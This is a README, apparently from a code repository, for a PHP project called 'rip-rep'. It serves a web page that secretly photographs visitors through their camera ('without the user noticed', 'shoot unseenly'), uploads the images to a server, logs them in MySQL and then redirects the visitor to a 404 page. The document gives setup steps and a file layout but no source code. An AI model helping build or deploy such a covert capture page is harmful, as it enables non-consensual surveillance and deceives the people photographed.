<h1>rip-rep</h1>

<p>This project allows users to capture images using their camera and upload them to the server. The image file path is stored in a database for future use. The program consists of the following features:</p>

<ul>
  <li>Capture image using the camera without the user noticed</li>
  <li>Upload image to the server</li>
  <li>Save image path to the database</li>
</ul>

<h2>Prerequisites</h2>
<ul>
  <li>Web Server: Apache (XAMPP or similar)</li>
  <li>PHP (version 7.x or higher)</li>
  <li>MySQL or any database to store the image paths</li>
  <li>Camera access on your device</li>
</ul>

<h2>Installation</h2>

<ol>
  <li>Download and install <strong>XAMPP</strong> if you haven't already from <a href="https://www.apachefriends.org/index.html" target="_blank">here</a>.</li>
  <li>Place this project inside the <strong>htdocs</strong> directory of your XAMPP installation (typically located at <strong>/opt/lampp/htdocs/</strong>).</li>
  <li>Ensure that the <strong>uploads/</strong> folder inside your project is created and has the correct permissions (read/write).</li>
  <li>Create "uploads" folder directory</li>
  <li>Start Apache and MySQL from the XAMPP Control Panel.</li>
  <li>Set up a MySQL database and table to store image paths, using the following SQL (optional):</li>
  <pre>
    CREATE TABLE images (
        id INT AUTO_INCREMENT PRIMARY KEY,
        image VARCHAR(255) NOT NULL
    );
  </pre>
</ol>

<h2>How to Use</h2>
<ol>
  <li>Open your browser and go to <code>http://localhost/rip-rep/blower.php.</li>
  <li>On the webpage, you will get shoot unseenly</li>
  <li>After the image is captured, the image will be uploaded to the server.</li>
  <li>The path to the image will be saved in your MySQL database.</li>
  <li>Finally you gonna get redirecto 404 not found</li>
</ol>

<h2>File Structure</h2>
<pre>
  /your_project_folder
    ├── blower.php      # The page for capturing the image from the camera
    ├── dumbass.php     # The page for displaying the gallery or handling the uploaded images
    ├── uploads/        # Folder to store uploaded images
    └── README.md       # This readme file
</pre>

<h2>File Permissions</h2>
<p>If you encounter issues with uploading images, make sure that the <strong>uploads/</strong> folder has the correct write permissions. You can set the permissions by running the following command:</p>

<pre>
  sudo chmod -R 755 uploads/
  sudo chown -R daemon:daemon uploads/
</pre>

<h2>Possible Issues</h2>
<ul>
  <li>Ensure your browser has permission to access the camera.</li>
  <li>If the image upload is not working, check the Apache error logs for any permission errors.</li>
  <li>Ensure the <strong>uploads/</strong> directory exists and has write permissions.</li>
</ul>

<h2>License</h2>
<p>This program is free to use and modify. No license restrictions apply unless specified.</p>
